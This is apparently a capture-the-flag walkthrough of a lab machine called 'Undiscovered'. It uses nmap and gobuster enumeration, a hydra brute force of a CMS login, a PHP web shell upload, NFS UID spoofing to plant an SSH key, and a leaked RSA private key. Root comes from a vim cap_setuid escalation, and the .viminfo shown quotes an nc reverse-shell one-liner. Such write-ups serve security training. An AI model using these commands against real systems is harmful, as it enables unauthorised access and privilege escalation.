> Undiscovered

# Nmap

nmap -sC -sV -T4 -Pn -A -vv -p- -oN nmap/initial 10.10.156.136

```bash
22/tcp    open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     syn-ack Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://undiscovered.thm
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
2049/tcp  open  nfs      syn-ack 2-4 (RPC #100003)
34697/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
```

Nothing in NFS let's try directory bruteforcing. 

# Gobuster

gobuster dir -u http://undiscovered.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q -o gobuster/initial

```bash
/images               (Status: 301) [Size: 321] [--> http://undiscovered.thm/images/]
/server-status        (Status: 403) [Size: 281]
```

Nothing here too! Let's try for virtual hosts.

gobuster vhost -u http://undiscovered.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -q -o gobuster/vhosts 

Wow! What? Looks like we are getting more garbage 302 results let's just focus on status code 200.

gobuster vhost -u http://undiscovered.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -q -o gobuster/vhosts | grep 200


```bash
gobuster/vhosts:Found: manager.undiscovered.thm (Status: 200) [Size: 4584]
gobuster/vhosts:Found: dashboard.undiscovered.thm (Status: 200) [Size: 4626]
gobuster/vhosts:Found: deliver.undiscovered.thm (Status: 200) [Size: 4650]
gobuster/vhosts:Found: newsite.undiscovered.thm (Status: 200) [Size: 4584]
gobuster/vhosts:Found: develop.undiscovered.thm (Status: 200) [Size: 4584]
gobuster/vhosts:Found: network.undiscovered.thm (Status: 200) [Size: 4584]
gobuster/vhosts:Found: forms.undiscovered.thm (Status: 200) [Size: 4542]
gobuster/vhosts:Found: maintenance.undiscovered.thm (Status: 200) [Size: 4668]
gobuster/vhosts:Found: view.undiscovered.thm (Status: 200) [Size: 4521]
gobuster/vhosts:Found: mailgate.undiscovered.thm (Status: 200) [Size: 4605]
gobuster/vhosts:Found: start.undiscovered.thm (Status: 200) [Size: 4542]
gobuster/vhosts:Found: play.undiscovered.thm (Status: 200) [Size: 4521]
gobuster/vhosts:Found: terminal.undiscovered.thm (Status: 200) [Size: 4605]
gobuster/vhosts:Found: booking.undiscovered.thm (Status: 200) [Size: 4599]
gobuster/vhosts:Found: gold.undiscovered.thm (Status: 200) [Size: 4521]
gobuster/vhosts:Found: internet.undiscovered.thm (Status: 200) [Size: 4605]
gobuster/vhosts:Found: resources.undiscovered.thm (Status: 200) [Size: 4626]
```

Actually I added all the hostnames to /etc/hosts and accessed it in firefox. Only deliver.undiscovered.thm is different. Actuall the color says it! And we got Rite CMS.

gobuster dir -u http://deliver.undiscovered.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q -o gobuster/deliver

```bash
/media                (Status: 301) [Size: 336] [--> http://deliver.undiscovered.thm/media/]
/templates            (Status: 301) [Size: 340] [--> http://deliver.undiscovered.thm/templates/]
/files                (Status: 301) [Size: 336] [--> http://deliver.undiscovered.thm/files/]    
/data                 (Status: 301) [Size: 335] [--> http://deliver.undiscovered.thm/data/]     
/cms                  (Status: 301) [Size: 334] [--> http://deliver.undiscovered.thm/cms/]      
/js                   (Status: 301) [Size: 333] [--> http://deliver.undiscovered.thm/js/]       
/LICENSE              (Status: 200) [Size: 32472]                                               
/server-status        (Status: 403) [Size: 289]
```

Accessing /data we got something interesting. We got some SQL information. In userdata we got some creds.

`admin009dbadbcd5c49a89011b47c8cb27a81fcc0f2be54669b`

In `content` file we can find something weird!

```
to_do.txt[ ] fix `showmount` issue for v2 and v3 (mounting nfs share work just fine..hmm weird)
[/] create nfs share for william on /home/william
```

Ok! Also now moving onto /cms we are promted with a login!

hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/:username=^USER^&userpw=^PASS^&LOGIN=log in:login_failed"

```bash
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
```

And yep! We are in! And we can naviagte to `Administration >> File Manager >> Upload file` and accessing `http://deliver.undiscovered.thm/media/shell.php` we have a shell!

Hmm! Let's remeber that we had NFS but couldn't access it! So let's check our `/etc/exports`.

```bash
/home/william	*(rw,root_squash)
```

Let's mount it to our system locally. But before that we have to create a user locally with same UID. We can refer /etc/passwd for this.

```bash
sudo mount -t nfs $IP:/home/william /mnt/thm
sudo useradd william -u 3003
sudo su william
cd /mnt/thm
cat /home/n00bmast3r/TryHackMe/Undiscovered/william.pub > .ssh/authorized_keys
ssh -i william william@$IP
```

# user.txt

```
THM{8d7b7299cccd1796a61915901d0e091c}
```

Ok now moving on we can see another interesting file `script` owned by `leonard`. Running strings on the file displayed `/bin/cat` and `/home/leonard`. I assume that it can list contents in leonard's home dir. How about we try 

./script .ssh/id_rsa

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
```

In remote machine, follow the steps to escalate as leonard!

```bash
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa leonard@localhost
```

# Priv Esc

Let's run linpeas. We can find something interesting

```bash
Files with capabilities:
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
```

Looking at .viminfo we can see that the user leonard has tried to get a reverse shell using vim.

```bash
# File marks:
'0  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'1  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
'2  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'3  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

# Jumplist (newest first):
-'  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
```

Let's take a look at GTFO Bins

```
Capabilities: 
If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
This requires that vim is compiled with Python support. Prepend :py3 for Python 3.

./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

Since we are working with python3 let's use :py3 and we have vim.basic set with `cap_setuid+ep
set with `

```
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

And we are in as root!